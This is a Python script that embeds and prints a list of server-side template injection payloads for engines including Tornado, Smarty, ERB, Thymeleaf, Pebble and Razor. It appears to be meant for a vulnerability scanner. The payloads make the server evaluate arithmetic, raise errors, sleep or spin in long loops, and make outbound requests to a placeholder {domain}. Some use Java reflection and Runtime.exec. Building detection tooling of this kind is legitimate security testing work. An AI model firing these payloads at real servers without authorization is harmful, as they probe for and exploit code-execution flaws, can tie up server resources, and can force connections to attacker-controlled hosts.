#!/usr/bin/env python3
"""Generate missing SSTI payloads for engines not yet covered.

Every payload produces a detectable signal:
  - math   : 1337 appears in reflected output
  - error  : exception / error text in response
  - timing : >4.5 s delay
  - oob    : outbound request to {domain}

Output format:  ##Header## followed by one payload per line.
"""

PAYLOADS = r"""
##Tornado (Python) - Math##
{{7*191}}
{{7*191}}
##Tornado (Python) - Error##
{{invalid.__class__}}
{{[].__class__.__bases__[99]}}
##Tornado (Python) - Timing##
{%import time%}{{time.sleep(5)}}
##Tornado (Python) - OOB##
{%import urllib.request%}{{urllib.request.urlopen('http://{domain}/tornado')}}
{%import urllib.request%}{{urllib.request.urlopen('http://{domain}/tornado').read()}}

##Nunjucks (Node) - Math##
{{7*191}}
{{range(1337)|first}}
##Nunjucks (Node) - Error##
{{invalid}}
{{invalid.missing}}
##Nunjucks (Node) - Timing##
{{range(99999999)|join}}
{{range(99999999)|length}}

##Pug (Node) - Math##
=7*191
#{7*191}
##Pug (Node) - Error##
=invalid
=undefined.property.deep
##Pug (Node) - Timing##
-var x=0;while(x<99999999){x++}
-for(var i=0;i<99999999;i++){}

##Mustache (Logic-less) - Error##
{{#invalid}}{{/invalid}}
{{> invalid_partial}}
{{invalid.missing}}

##Smarty (PHP) - Math##
{7*191}
{math equation="7*191"}
{math equation="7 * 191"}
##Smarty (PHP) - Error##
{$invalid}
{invalid_function()}
##Smarty (PHP) - Timing##
{php}sleep(5);{/php}
##Smarty (PHP) - OOB##
{fetch file="http://{domain}/smarty"}
{fetch file="http://{domain}/smarty" assign="x"}

##ERB (Ruby) - Math##
<%=7*191%>
<%= 7 * 191 %>
##ERB (Ruby) - Error##
<%=invalid%>
<%=raise 'ssti_error'%>
##ERB (Ruby) - Timing##
<%=sleep(5)%>
<%=sleep 5%>
##ERB (Ruby) - OOB##
<%=require 'net/http';Net::HTTP.get(URI('http://{domain}/erb'))%>
<%=require 'open-uri';URI.open('http://{domain}/erb').read%>

##Slim (Ruby) - Math##
=7*191
= 7 * 191
##Slim (Ruby) - Error##
=invalid_var
=raise 'ssti_error'
##Slim (Ruby) - Timing##
=sleep(5)
##Slim (Ruby) - OOB##
=require 'net/http';Net::HTTP.get(URI('http://{domain}/slim'))

##Haml (Ruby) - Math##
=7*191
= 7 * 191
##Haml (Ruby) - Error##
=invalid_var
=raise 'ssti_error'
##Haml (Ruby) - Timing##
=sleep(5)
##Haml (Ruby) - OOB##
=require 'net/http';Net::HTTP.get(URI('http://{domain}/haml'))

##Liquid (Ruby/Shopify) - Error##
{{invalid}}
{{invalid | no_such_filter}}
{{invalid.missing.deep}}

##Thymeleaf (Java) - Math##
[[${7*191}]]
[[${T(java.lang.Math).abs(-1337)}]]
*{7*191}
~{7*191}
##Thymeleaf (Java) - Error##
[[${T(invalid).method()}]]
[[${T(java.lang.Runtime).exec('invalid')}]]
##Thymeleaf (Java) - Timing##
[[${T(java.lang.Thread).sleep(5000)}]]
##Thymeleaf (Java) - OOB##
[[${T(java.net.URL).new('http://{domain}/thymeleaf').openStream()}]]
[[${new java.util.Scanner(T(java.net.URL).new('http://{domain}/thymeleaf').openStream()).next()}]]

##Pebble (Java) - Math##
{{7*191}}
{{"".class.forName("java.lang.Math").getMethod("abs",long.class).invoke(null,-1337)}}
##Pebble (Java) - Error##
{{invalid}}
{{invalid.missing()}}
##Pebble (Java) - Timing##
{{"".getClass().forName("java.lang.Thread").getMethod("sleep",long.class).invoke(null,5000)}}
##Pebble (Java) - OOB##
{{"".getClass().forName("java.net.URL").getConstructor("".getClass()).newInstance("http://{domain}/pebble").openStream()}}

##Razor (C#/.NET) - Math##
@(7*191)
@(System.Math.Abs(-1337))
##Razor (C#/.NET) - Error##
@(invalid)
@(throw new System.Exception("ssti_error"))
##Razor (C#/.NET) - Timing##
@{System.Threading.Thread.Sleep(5000);}
##Razor (C#/.NET) - OOB##
@{new System.Net.WebClient().DownloadString("http://{domain}/razor");}
@{new System.Net.Http.HttpClient().GetStringAsync("http://{domain}/razor").Result;}

##Go text/template - Math##
{{printf "%d" 1337}}
{{html 1337}}
##Go text/template - Error##
{{.Invalid}}
{{call .Invalid}}
{{template "nonexistent"}}
""".strip()


def main():
    for line in PAYLOADS.splitlines():
        stripped = line.strip()
        if stripped:
            print(stripped)


if __name__ == "__main__":
    main()
